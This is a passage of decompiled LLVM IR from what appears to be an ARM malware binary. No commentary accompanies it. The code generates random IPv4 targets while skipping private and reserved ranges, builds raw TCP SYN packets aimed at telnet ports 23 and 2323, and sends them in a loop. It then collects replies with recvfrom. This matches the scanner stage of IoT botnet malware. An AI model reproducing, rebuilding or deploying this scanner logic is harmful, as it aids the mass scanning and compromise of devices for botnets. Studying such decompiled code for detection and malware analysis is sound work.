  store i1 %v2_f028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f028, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_f018
  %v3_f02c = icmp ugt i32 %v1_f01c, 126
  store i1 %v3_f02c, i1* %cpsr_c.global-to-local, align 1
  %v8_f02c = icmp eq i32 %v1_f01c, 127
  store i1 %v8_f02c, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_f018, %bb373
  %v0_f03c = phi i1 [ true, %dec_label_pc_f018 ], [ %v8_f02c, %bb373 ]
  %v1_f030 = urem i32 %v3_f020, 256
  store i32 %v1_f030, i32* %ip.global-to-local, align 4
  %v1_f034 = urem i32 %v3_f024, 256
  store i32 %v1_f034, i32* %r2.global-to-local, align 4
  %v1_f038 = and i32 %v0_f018, 8388608
  %v2_f038 = icmp ne i32 %v1_f038, 0
  store i1 %v2_f038, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f03c, label %dec_label_pc_f018, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %bb374
  %v2_f040 = icmp ugt i32 %v1_f01c, 2
  store i1 %v2_f040, i1* %cpsr_c.global-to-local, align 1
  %v7_f040 = icmp eq i32 %v1_f01c, 3
  store i1 %v7_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f040, label %dec_label_pc_f018, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f040
  %v1_f048 = add nsw i32 %v1_f01c, -15
  store i32 %v1_f048, i32* %r3.global-to-local, align 4
  %v2_f04c = icmp ugt i32 %v1_f01c, 55
  store i1 %v2_f04c, i1* %cpsr_c.global-to-local, align 1
  %v7_f04c = icmp eq i32 %v1_f01c, 56
  store i1 %v7_f04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f04c, label %dec_label_pc_f018, label %bb375

bb375:                                            ; preds = %dec_label_pc_f048
  %v3_f050 = icmp ne i32 %v1_f048, 0
  store i1 %v3_f050, i1* %cpsr_c.global-to-local, align 1
  %v8_f050 = icmp eq i32 %v1_f048, 1
  store i1 %v8_f050, i1* %cpsr_z.global-to-local, align 1
  %v2_f054 = xor i1 %v3_f050, true
  %v3_f054 = or i1 %v8_f050, %v2_f054
  br i1 %v3_f054, label %dec_label_pc_f018, label %dec_label_pc_f058

dec_label_pc_f058:                                ; preds = %bb375
  %v2_f058 = icmp ugt i32 %v1_f01c, 9
  store i1 %v2_f058, i1* %cpsr_c.global-to-local, align 1
  %v7_f058 = icmp eq i32 %v1_f01c, 10
  store i1 %v7_f058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f058, label %dec_label_pc_f018, label %dec_label_pc_f060

dec_label_pc_f060:                                ; preds = %dec_label_pc_f058
  %v2_f060 = icmp ugt i32 %v1_f01c, 191
  store i1 %v2_f060, i1* %cpsr_c.global-to-local, align 1
  %v7_f060 = icmp eq i32 %v1_f01c, 192
  store i1 %v7_f060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f060, label %bb376, label %dec_label_pc_f06c

bb376:                                            ; preds = %dec_label_pc_f060
  %v3_f064 = icmp ugt i32 %v1_f030, 167
  store i1 %v3_f064, i1* %cpsr_c.global-to-local, align 1
  %v8_f064 = icmp eq i32 %v1_f030, 168
  store i1 %v8_f064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f064, label %dec_label_pc_f018, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f060, %bb376
  %v7_f06c = icmp eq i32 %v1_f01c, 172
  %.458 = zext i1 %v7_f06c to i32
  store i32 %.458, i32* %r3.global-to-local, align 4
  %v2_f078 = icmp ugt i32 %v1_f030, 14
  store i1 %v2_f078, i1* %cpsr_c.global-to-local, align 1
  %v7_f078 = icmp eq i32 %v1_f030, 15
  store i1 %v7_f078, i1* %cpsr_z.global-to-local, align 1
  %v2_f07c = xor i1 %v2_f078, true
  %v3_f07c = or i1 %v7_f078, %v2_f07c
  br i1 %v3_f07c, label %.thread7, label %bb379

.thread7:                                         ; preds = %dec_label_pc_f06c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f090

bb379:                                            ; preds = %dec_label_pc_f06c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f080 = icmp eq i1 %v7_f06c, false
  store i1 %v2_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f080, label %dec_label_pc_f090, label %dec_label_pc_f088

dec_label_pc_f088:                                ; preds = %bb379
  %v2_f088 = icmp ugt i32 %v1_f030, 30
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %v7_f088 = icmp eq i32 %v1_f030, 31
  store i1 %v7_f088, i1* %cpsr_z.global-to-local, align 1
  %v2_f08c = xor i1 %v2_f088, true
  %v3_f08c = or i1 %v7_f088, %v2_f08c
  br i1 %v3_f08c, label %dec_label_pc_f018, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %.thread7, %dec_label_pc_f088, %bb379
  %v7_f090 = icmp eq i32 %v1_f01c, 100
  %.459 = zext i1 %v7_f090 to i32
  store i32 %.459, i32* %r3.global-to-local, align 4
  %v2_f09c = icmp ugt i32 %v1_f030, 62
  store i1 %v2_f09c, i1* %cpsr_c.global-to-local, align 1
  %v7_f09c = icmp eq i32 %v1_f030, 63
  store i1 %v7_f09c, i1* %cpsr_z.global-to-local, align 1
  %v2_f0a0 = xor i1 %v2_f09c, true
  %v3_f0a0 = or i1 %v7_f09c, %v2_f0a0
  br i1 %v3_f0a0, label %.thread12, label %bb382

.thread12:                                        ; preds = %dec_label_pc_f090
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0b4

bb382:                                            ; preds = %dec_label_pc_f090
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0a4 = icmp eq i1 %v7_f090, false
  store i1 %v2_f0a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0a4, label %dec_label_pc_f0b4, label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %bb382
  %v2_f0ac = icmp ugt i32 %v1_f030, 125
  store i1 %v2_f0ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ac = icmp eq i32 %v1_f030, 126
  store i1 %v7_f0ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f0b0 = xor i1 %v2_f0ac, true
  %v3_f0b0 = or i1 %v7_f0ac, %v2_f0b0
  br i1 %v3_f0b0, label %dec_label_pc_f018, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %.thread12, %dec_label_pc_f0ac, %bb382
  %v2_f0b4 = icmp ugt i32 %v1_f01c, 168
  store i1 %v2_f0b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0b4 = icmp eq i32 %v1_f01c, 169
  store i1 %v7_f0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0b4, label %bb383, label %dec_label_pc_f0c0

bb383:                                            ; preds = %dec_label_pc_f0b4
  %v3_f0b8 = icmp eq i32 %v1_f030, 255
  store i1 %v3_f0b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f0b8, label %dec_label_pc_f018, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0b4, %bb383
  %v7_f0c0 = icmp eq i32 %v1_f01c, 198
  %.460 = zext i1 %v7_f0c0 to i32
  store i32 %.460, i32* %r3.global-to-local, align 4
  %v2_f0cc = icmp ugt i32 %v1_f030, 16
  store i1 %v2_f0cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0cc = icmp eq i32 %v1_f030, 17
  store i1 %v7_f0cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0d0 = xor i1 %v2_f0cc, true
  %v3_f0d0 = or i1 %v7_f0cc, %v2_f0d0
  br i1 %v3_f0d0, label %.thread18, label %bb386

.thread18:                                        ; preds = %dec_label_pc_f0c0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0e4

bb386:                                            ; preds = %dec_label_pc_f0c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0d4 = icmp eq i1 %v7_f0c0, false
  store i1 %v2_f0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0d4, label %dec_label_pc_f0e4, label %dec_label_pc_f0dc

dec_label_pc_f0dc:                                ; preds = %bb386
  %v2_f0dc = icmp ugt i32 %v1_f030, 18
  store i1 %v2_f0dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0dc = icmp eq i32 %v1_f030, 19
  store i1 %v7_f0dc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0e0 = xor i1 %v2_f0dc, true
  %v3_f0e0 = or i1 %v7_f0dc, %v2_f0e0
  br i1 %v3_f0e0, label %dec_label_pc_f018, label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %.thread18, %dec_label_pc_f0dc, %bb386
  %v2_f0e4 = icmp ugt i32 %v1_f01c, 222
  store i1 %v2_f0e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0e4 = icmp eq i32 %v1_f01c, 223
  store i1 %v7_f0e4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0e8 = xor i1 %v7_f0e4, true
  %v3_f0e8 = and i1 %v2_f0e4, %v2_f0e8
  br i1 %v3_f0e8, label %dec_label_pc_f018, label %dec_label_pc_f0ec

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0e4
  %v7_f0ec = icmp eq i32 %v1_f01c, 106
  %.461 = zext i1 %v7_f0ec to i32
  %v2_f0f8 = icmp ugt i32 %v1_f030, 185
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i32 %v1_f030, 186
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0f8, label %bb389, label %dec_label_pc_f104

bb389:                                            ; preds = %dec_label_pc_f0ec
  %v2_f0ec = icmp ugt i32 %v1_f01c, 105
  store i1 %v2_f0ec, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0ec, label %dec_label_pc_f018, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0ec, %bb389
  %v2_f104 = icmp ugt i32 %v1_f030, 186
  store i1 %v2_f104, i1* %cpsr_c.global-to-local, align 1
  %v7_f104 = icmp eq i32 %v1_f030, 187
  store i1 %v7_f104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f104, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_f104
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f118

.thread23:                                        ; preds = %dec_label_pc_f104
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f110 = icmp eq i1 %v7_f0ec, false
  store i1 %v2_f110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f110, label %dec_label_pc_f118, label %dec_label_pc_f018

dec_label_pc_f118:                                ; preds = %.thread24, %.thread23
  %v2_f118 = icmp ugt i32 %v1_f030, 184
  store i1 %v2_f118, i1* %cpsr_c.global-to-local, align 1
  %v7_f118 = icmp eq i32 %v1_f030, 185
  store i1 %v7_f118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f118, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f118
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f12c

.thread27:                                        ; preds = %dec_label_pc_f118
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f124 = icmp eq i1 %v7_f0ec, false
  store i1 %v2_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f124, label %dec_label_pc_f12c, label %dec_label_pc_f018

dec_label_pc_f12c:                                ; preds = %.thread28, %.thread27
  %v2_f12c = icmp ugt i32 %v1_f030, 183
  store i1 %v2_f12c, i1* %cpsr_c.global-to-local, align 1
  %v7_f12c = icmp eq i32 %v1_f030, 184
  store i1 %v7_f12c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f12c, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_f12c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f140

.thread31:                                        ; preds = %dec_label_pc_f12c
  store i32 %.461, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f138 = icmp eq i1 %v7_f0ec, false
  store i1 %v2_f138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f138, label %dec_label_pc_f140, label %dec_label_pc_f018

dec_label_pc_f140:                                ; preds = %.thread32, %.thread31
  %v2_f140 = icmp ugt i32 %v1_f01c, 149
  store i1 %v2_f140, i1* %cpsr_c.global-to-local, align 1
  %v7_f140 = icmp eq i32 %v1_f01c, 150
  store i1 %v7_f140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f140, label %bb390, label %dec_label_pc_f14c

bb390:                                            ; preds = %dec_label_pc_f140
  %v3_f144 = icmp ugt i32 %v1_f030, 30
  store i1 %v3_f144, i1* %cpsr_c.global-to-local, align 1
  %v8_f144 = icmp eq i32 %v1_f030, 31
  store i1 %v8_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f144, label %dec_label_pc_f018, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f140, %bb390
  %v2_f14c = icmp ugt i32 %v1_f01c, 48
  store i1 %v2_f14c, i1* %cpsr_c.global-to-local, align 1
  %v7_f14c = icmp eq i32 %v1_f01c, 49
  store i1 %v7_f14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f14c, label %bb391, label %dec_label_pc_f158

bb391:                                            ; preds = %dec_label_pc_f14c
  %v3_f150 = icmp ugt i32 %v1_f030, 50
  store i1 %v3_f150, i1* %cpsr_c.global-to-local, align 1
  %v8_f150 = icmp eq i32 %v1_f030, 51
  store i1 %v8_f150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f150, label %dec_label_pc_f018, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f14c, %bb391
  %v2_f158 = icmp ugt i32 %v1_f01c, 177
  store i1 %v2_f158, i1* %cpsr_c.global-to-local, align 1
  %v7_f158 = icmp eq i32 %v1_f01c, 178
  store i1 %v7_f158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f158, label %bb392, label %dec_label_pc_f164

bb392:                                            ; preds = %dec_label_pc_f158
  %v3_f15c = icmp ugt i32 %v1_f030, 61
  store i1 %v3_f15c, i1* %cpsr_c.global-to-local, align 1
  %v8_f15c = icmp eq i32 %v1_f030, 62
  store i1 %v8_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f15c, label %dec_label_pc_f018, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f158, %bb392
  %v2_f164 = icmp ugt i32 %v1_f01c, 159
  store i1 %v2_f164, i1* %cpsr_c.global-to-local, align 1
  %v7_f164 = icmp eq i32 %v1_f01c, 160
  store i1 %v7_f164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f164, label %bb393, label %dec_label_pc_f170

bb393:                                            ; preds = %dec_label_pc_f164
  %v3_f168 = icmp ugt i32 %v1_f030, 12
  store i1 %v3_f168, i1* %cpsr_c.global-to-local, align 1
  %v8_f168 = icmp eq i32 %v1_f030, 13
  store i1 %v8_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f168, label %dec_label_pc_f018, label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %dec_label_pc_f164, %bb393
  %v1_f170 = add nsw i32 %v1_f01c, -6
  store i32 %v1_f170, i32* %r3.global-to-local, align 4
  %v2_f174 = icmp ugt i32 %v1_f01c, 10
  store i1 %v2_f174, i1* %cpsr_c.global-to-local, align 1
  %v7_f174 = icmp eq i32 %v1_f01c, 11
  store i1 %v7_f174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f174, label %dec_label_pc_f018, label %bb394

bb394:                                            ; preds = %dec_label_pc_f170
  %v3_f178 = icmp ne i32 %v1_f170, 0
  store i1 %v3_f178, i1* %cpsr_c.global-to-local, align 1
  %v8_f178 = icmp eq i32 %v1_f170, 1
  store i1 %v8_f178, i1* %cpsr_z.global-to-local, align 1
  %v2_f17c = xor i1 %v3_f178, true
  %v3_f17c = or i1 %v8_f178, %v2_f17c
  br i1 %v3_f17c, label %dec_label_pc_f018, label %dec_label_pc_f180

dec_label_pc_f180:                                ; preds = %bb394
  %v2_f180 = icmp ugt i32 %v1_f01c, 21
  store i1 %v2_f180, i1* %cpsr_c.global-to-local, align 1
  %v7_f180 = icmp eq i32 %v1_f01c, 22
  store i1 %v7_f180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f180, label %dec_label_pc_f018, label %bb395

bb395:                                            ; preds = %dec_label_pc_f180
  %v3_f184 = icmp ugt i32 %v1_f01c, 20
  store i1 %v3_f184, i1* %cpsr_c.global-to-local, align 1
  %v8_f184 = icmp eq i32 %v1_f01c, 21
  store i1 %v8_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f184, label %dec_label_pc_f018, label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %bb395
  %v2_f18c = icmp ugt i32 %v1_f01c, 27
  store i1 %v2_f18c, i1* %cpsr_c.global-to-local, align 1
  %v7_f18c = icmp eq i32 %v1_f01c, 28
  store i1 %v7_f18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f18c, label %dec_label_pc_f018, label %bb396

bb396:                                            ; preds = %dec_label_pc_f18c
  %v3_f190 = icmp ugt i32 %v1_f01c, 25
  store i1 %v3_f190, i1* %cpsr_c.global-to-local, align 1
  %v8_f190 = icmp eq i32 %v1_f01c, 26
  store i1 %v8_f190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f190, label %dec_label_pc_f018, label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %bb396
  %v2_f198 = icmp ugt i32 %v1_f01c, 29
  store i1 %v2_f198, i1* %cpsr_c.global-to-local, align 1
  %v7_f198 = icmp eq i32 %v1_f01c, 30
  store i1 %v7_f198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f198, label %dec_label_pc_f018, label %bb397

bb397:                                            ; preds = %dec_label_pc_f198
  %v3_f19c = icmp ugt i32 %v1_f01c, 28
  store i1 %v3_f19c, i1* %cpsr_c.global-to-local, align 1
  %v8_f19c = icmp eq i32 %v1_f01c, 29
  store i1 %v8_f19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f19c, label %dec_label_pc_f018, label %dec_label_pc_f1a4

dec_label_pc_f1a4:                                ; preds = %bb397
  %v2_f1a4 = icmp ugt i32 %v1_f01c, 54
  store i1 %v2_f1a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a4 = icmp eq i32 %v1_f01c, 55
  store i1 %v7_f1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1a4, label %dec_label_pc_f018, label %bb398

bb398:                                            ; preds = %dec_label_pc_f1a4
  %v3_f1a8 = icmp ugt i32 %v1_f01c, 32
  store i1 %v3_f1a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1a8 = icmp eq i32 %v1_f01c, 33
  store i1 %v8_f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1a8, label %dec_label_pc_f018, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %bb398
  %v2_f1b0 = icmp ugt i32 %v1_f01c, 214
  store i1 %v2_f1b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1b0 = icmp eq i32 %v1_f01c, 215
  store i1 %v7_f1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1b0, label %.thread47, label %bb399

bb399:                                            ; preds = %dec_label_pc_f1b0
  %v3_f1b4 = icmp ugt i32 %v1_f01c, 213
  store i1 %v3_f1b4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1b4 = icmp eq i32 %v1_f01c, 214
  store i1 %v8_f1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1b4, label %bb400, label %dec_label_pc_f1c4

.thread47:                                        ; preds = %dec_label_pc_f1b0
  br label %dec_label_pc_f018

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_f018

dec_label_pc_f1c4:                                ; preds = %bb399
  %v5_f1d0 = call i32 @llvm.bswap.i32(i32 %v0_f018)
  store i32 %v5_f1d0, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_f018, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_f1d8 = udiv i32 %v5_f1d0, 16777216
  %v1_f1dc = and i32 %v5_f1d0, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v4_f1e0 = udiv i32 %tmp402, 256
  %v4_f1e4 = mul i32 %v1_f1dc, 256
  store i32 ptrtoint (i8** @global_var_22448.158 to i32), i32* @r0, align 4
  %tmp403 = and i32 %v0_f018, 65536
  %v3_f1ec = icmp ne i32 %tmp403, 0
  store i1 %v3_f1ec, i1* %cpsr_c.global-to-local, align 1
  %v4_f1ec = mul i32 %v5_f1d0, 16777216
  %v5_f1e0 = or i32 %v4_f1ec, %v3_f1d8
  %v5_f1e4 = or i32 %v5_f1e0, %v4_f1e0
  %v5_f1ec = or i32 %v5_f1e4, %v4_f1e4
  store i32 %v5_f1ec, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_22452.200 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_f1ec, i32* @global_var_22458.201, align 4
  %v3_f1fc = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_22448.158 to i32), i32 20)
  %v4_f1fc = trunc i32 %v3_f1fc to i16
  %v3_f200 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f200, i32* %r1.global-to-local, align 4
  %v5_f210 = sdiv i32 %v3_f200, 10
  %v3_f214 = mul i32 %v5_f210, 8
  store i32 %v3_f214, i32* %r2.global-to-local, align 4
  %v2_f21c = mul i32 %v5_f210, 10
  store i32 %v2_f21c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22448.158 to i32), i32* %ip.global-to-local, align 4
  %v3_f224 = icmp uge i32 %v3_f200, %v2_f21c
  store i1 %v3_f224, i1* %cpsr_c.global-to-local, align 1
  %v9_f224 = icmp eq i32 %v3_f200, %v2_f21c
  store i1 %v9_f224, i1* %cpsr_z.global-to-local, align 1
  store i16 %v4_f1fc, i16* bitcast (i32* @global_var_22452.200 to i16*), align 4
  br i1 %v9_f224, label %.thread56.thread, label %bb404

.thread56.thread:                                 ; preds = %dec_label_pc_f1c4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32 2) to i16*), align 2
  %v4_f240288 = load i32, i32* @global_var_22458.201, align 4
  store i32 %v4_f240288, i32* @global_var_22460.203, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb405

bb404:                                            ; preds = %dec_label_pc_f1c4
  %v4_f240291 = load i32, i32* @global_var_22458.201, align 4
  store i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r2.global-to-local, align 4
  store i32 %v4_f240291, i32* @global_var_22460.203, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32 2) to i16*), align 2
  br label %bb405

bb405:                                            ; preds = %.thread56.thread, %bb404
  store i16 0, i16* bitcast (i32* @global_var_2246c.204 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_f26c = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_22448.158 to i32), i32 ptrtoint (i32* @global_var_2245c.161 to i32), i32 5120, i32 20)
  %v6_f26c = trunc i32 %v5_f26c to i16
  store i32 ptrtoint (i8** @global_var_22448.158 to i32), i32* %r1.global-to-local, align 4
  %v2_f278 = load i32, i32* @global_var_24f60.156, align 4
  store i16 %v6_f26c, i16* bitcast (i32* @global_var_2246c.204 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_f2a4 = load i16, i16* @global_var_2245e.166, align 2
  %v4_f2a4 = zext i16 %v3_f2a4 to i32
  store i32 %v4_f2a4, i32* @lr, align 4
  store i32 %v2_f878, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f2c0 = call i32 @__libc_sendto(i32 %v2_f278, i32 ptrtoint (i8** @global_var_22448.158 to i32), i32 40, i32 16384, i32 %v2_10354, i32 16)
  %v3_f2c4 = load i32, i32* %stack_var_-52, align 4
  %v1_f2c8 = add i32 %v3_f2c4, 1
  store i32 %v1_f2c8, i32* %r3.global-to-local, align 4
  %v3_f2cc = icmp ugt i32 %v1_f2c8, 483
  store i1 %v3_f2cc, i1* %cpsr_c.global-to-local, align 1
  %v8_f2cc = icmp eq i32 %v1_f2c8, 484
  store i1 %v8_f2cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f2c8, i32* %stack_var_-52, align 4
  %v5_f2d4 = icmp slt i32 %v1_f2c8, 484
  br i1 %v5_f2d4, label %dec_label_pc_efec, label %dec_label_pc_f2d8

dec_label_pc_f2d8:                                ; preds = %bb405
  %v0_f2d8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f2dc

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_efc8, %dec_label_pc_f2d8
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_efc8 ], [ %v0_f2d8, %dec_label_pc_f2d8 ]
  %v0_f2dc = call i32 @__GI___errno_location()
  store i32 %v2_efc0, i32* %r1.global-to-local, align 4
  store i32 %v1_f2e8, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v2_f2f8 = inttoptr i32 %v0_f2dc to i32*
  br label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f3b4, %dec_label_pc_f3ac, %dec_label_pc_f3a4, %dec_label_pc_f380, %dec_label_pc_f370, %dec_label_pc_f358, %dec_label_pc_f340, %dec_label_pc_f39c, %dec_label_pc_f390, %dec_label_pc_f338, %dec_label_pc_f474, %dec_label_pc_f2dc
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f2f8, align 4
  %v2_f304 = load i32, i32* @global_var_24f60.156, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_efc0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f314 = load i32, i32* %ip.global-to-local, align 4
  %v6_f31c = call i32 @__libc_recvfrom(i32 %v2_f304, i32 %v2_efc0, i32 1514, i32 16384, i32 %v0_f314, i32 %v0_f314)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f320 = icmp eq i32 %v6_f31c, 0
  store i1 %v2_f320, i1* %cpsr_z.global-to-local, align 1
  %tmp406 = icmp slt i32 %v6_f31c, 1
  br i1 %tmp406, label %dec_label_pc_f484, label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f2f0
  store i32 %v0_f2dc, i32* %ip.global-to-local, align 4
  %v2_f32c = load i32, i32* %v2_f2f8, align 4
  store i32 %v2_f32c, i32* %r3.global-to-local, align 4
  %v2_f330 = icmp ugt i32 %v2_f32c, 10
  store i1 %v2_f330, i1* %cpsr_c.global-to-local, align 1
  %v7_f330 = icmp eq i32 %v2_f32c, 11
  store i1 %v7_f330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f330, label %dec_label_pc_f484, label %dec_label_pc_f338

dec_label_pc_f338:                                ; preds = %dec_label_pc_f328
  %v2_f338 = icmp ugt i32 %v6_f31c, 38
  store i1 %v2_f338, i1* %cpsr_c.global-to-local, align 1
  %v7_f338 = icmp eq i32 %v6_f31c, 39
  store i1 %v7_f338, i1* %cpsr_z.global-to-local, align 1
  %v2_f33c = xor i1 %v2_f338, true
  %v3_f33c = or i1 %v7_f338, %v2_f33c
  br i1 %v3_f33c, label %dec_label_pc_f2f0, label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %dec_label_pc_f338
  store i32 %v2_efc0, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32* %r1.global-to-local, align 4
  %v3_f348 = load i32, i32* %v2_f348, align 4
  store i32 %v3_f348, i32* %r2.global-to-local, align 4
  %v2_f34c = load i32, i32* @global_var_24f40.59, align 4
